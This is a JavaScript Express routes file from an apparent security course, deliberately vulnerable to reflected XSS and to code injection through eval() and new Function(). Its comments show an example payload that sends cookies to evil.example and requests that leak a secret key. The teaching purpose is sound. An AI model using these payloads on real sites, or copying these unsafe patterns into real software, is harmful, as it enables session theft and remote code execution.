"use strict";

/**
 * INTENTIONALLY VULNERABLE ROUTES — for coursework demonstration only.
 *
 * Everything in this file exists to be exploited by the tests in
 * tests/xss.test.js and tests/eval.test.js, and to be contrasted with the
 * fixed versions in src/routes/secure.js. Do not copy these patterns into
 * real applications. See docs/VULNERABILITIES.md for the write-up.
 */

const express = require("express");

const router = express.Router();

// A value that must never be reachable through the public calculator API.
// Standing in for something like an internal API key or DB credential that
// happens to sit in the same module/closure scope as the vulnerable code.
const INTERNAL_API_KEY = "sk-demo-INTERNAL-SECRET-DO-NOT-LEAK";

/**
 * VULNERABILITY 1 — Reflected Code Injection (XSS) via web application.
 *
 * The "name" query parameter is concatenated directly into an HTML
 * response with no output encoding. Because the browser cannot tell the
 * attacker's <script> apart from markup the server intended to send, any
 * script the attacker places in `name` executes in the victim's browser,
 * in the origin of this application — e.g.
 *
 *   GET /vulnerable/greet?name=<script>document.location='https://evil.example/steal?c='+document.cookie</script>
 *
 * would exfiltrate the victim's cookies for this site to an attacker
 * controlled server, if this were served over a real origin with a
 * session cookie.
 */
router.get("/greet", (req, res) => {
  const name = req.query.name || "friend";
  // Only the interpolation on the "Hello, ${name}!" line below is the
  // vulnerability under test; everything else in this template (badge,
  // form, styling) is fixed markup with no user input in it.
  res.status(200).send(`
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <title>Vulnerable Greeting</title>
        <link rel="stylesheet" href="/shared/styles.css" />
      </head>
      <body>
        <div class="card">
          <span class="badge vuln">Vulnerable</span>
          <h1>Greeting</h1>
          <p class="hint">
            Type a name and submit — it is written straight into the page
            with no escaping. Try:
            <code>&lt;script&gt;document.querySelector('.result').insertAdjacentHTML('beforeend','&lt;p&gt;&lt;strong&gt;STATUS: Malicious script executed.&lt;/strong&gt;&lt;/p&gt;')&lt;/script&gt;</code>
            — the result appears right in the box below, the same way the
            calculator and formatter show theirs.
          </p>
          <form class="try-it" method="GET" action="/vulnerable/greet">
            <label class="field-label visually-hidden" for="name">Name</label>
            <input type="text" id="name" name="name" placeholder="Your name..." autocomplete="off" />
            <button type="submit">Greet me</button>
          </form>
          <div class="result">
            <p class="result-heading">Hello, ${name}!</p>
          </div>
        </div>
      </body>
    </html>
  `);
});

/**
 * VULNERABILITY 2a — Dynamic evaluation via eval().
 *
 * The service is meant to be a simple calculator: POST { "expression": "2+2" }.
 * Passing the raw string to eval() means the "calculator" actually runs
 * arbitrary JavaScript with the full privileges of the Node.js process —
 * eval() does not distinguish between "2+2" and any other JS source. Because
 * eval() runs in the enclosing scope, an attacker can also read variables
 * that were never meant to be exposed through this API, e.g.
 *
 *   POST /vulnerable/calculate  { "expression": "INTERNAL_API_KEY" }
 *
 * leaks the secret above. In a real deployment the same primitive can reach
 * `process`, `require`, the filesystem, environment variables, or spawn
 * subprocesses — i.e. full remote code execution, not just data leakage.
 */
router.post("/calculate", express.json(), (req, res) => {
  const { expression } = req.body || {};
  if (typeof expression !== "string") {
    return res.status(400).json({ error: "expression must be a string" });
  }
  try {
    // eslint-disable-next-line no-eval -- intentional, see doc comment above
    const result = eval(expression);
    res.status(200).json({ result });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

/**
 * VULNERABILITY 2b — Dynamic evaluation via the Function constructor.
 *
 * A "custom formatter" feature lets a user supply a JS expression that
 * formats a number (e.g. "n.toFixed(2)"). Building a function from that
 * string with `new Function(...)` is equivalent to eval() for security
 * purposes: it compiles and runs attacker-controlled source. `new Function`
 * bodies run in the global scope rather than the local closure, so this
 * variant is typically used to demonstrate reaching globals such as
 * `globalThis`/`process` directly, e.g.
 *
 *   POST /vulnerable/format { "formatter": "return process.version" }
 */
router.post("/format", express.json(), (req, res) => {
  const { formatter, value } = req.body || {};
  if (typeof formatter !== "string" || typeof value !== "number") {
    return res
      .status(400)
      .json({ error: "formatter must be a string and value a number" });
  }
  try {
    // eslint-disable-next-line no-new-func -- intentional, see doc comment above
    const fn = new Function("n", formatter);
    res.status(200).json({ result: fn(value) });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

module.exports = { router, INTERNAL_API_KEY };
